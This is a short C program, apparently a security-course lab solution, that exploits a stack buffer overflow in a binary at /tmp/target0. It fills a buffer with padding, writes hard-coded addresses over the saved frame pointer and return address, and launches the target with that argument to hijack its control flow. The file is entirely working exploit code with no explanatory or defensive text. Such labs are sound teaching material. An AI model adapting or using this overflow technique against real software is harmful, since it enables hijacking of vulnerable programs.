#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define TARGET "/tmp/target0"

int main(void) {
  char *args[3];
  char *env[1];

  char buf[29];
  memset(buf, 'A', sizeof(buf));
  strcpy(buf + 20, "\x48\xf8\xff\xbf"   // sfp
                   "\x15\x85\x04\x08"); // ret

  args[0] = TARGET;
  args[1] = buf;
  args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
